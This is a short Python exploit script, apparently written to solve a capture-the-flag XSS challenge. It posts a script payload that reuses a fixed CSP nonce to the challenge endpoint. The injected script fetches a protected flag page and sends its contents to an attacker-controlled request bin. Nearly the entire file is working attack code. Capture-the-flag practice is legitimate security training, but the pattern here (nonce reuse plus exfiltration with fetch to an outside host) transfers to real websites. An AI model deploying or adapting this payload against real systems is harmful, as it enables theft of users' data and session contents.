import sys
import requests


if len(sys.argv) != 3:
    print("python exploit.py <challenge-url> <request_bin>")

else:
    payload = '<script nonce=\'corgi\'>fetch(\'' + sys.argv[1] + '/xss-one-flag\').then(response => response.text()).then(data => fetch(`' + sys.argv[2] + '/?exploit=${encodeURIComponent(data)}`))</script>'
    data = {
        'payload':payload
    }
    response = requests.post(sys.argv[1] + '/xss-one-result', data=data)
    print(response.text)
# you can see the flag in ur requestbin!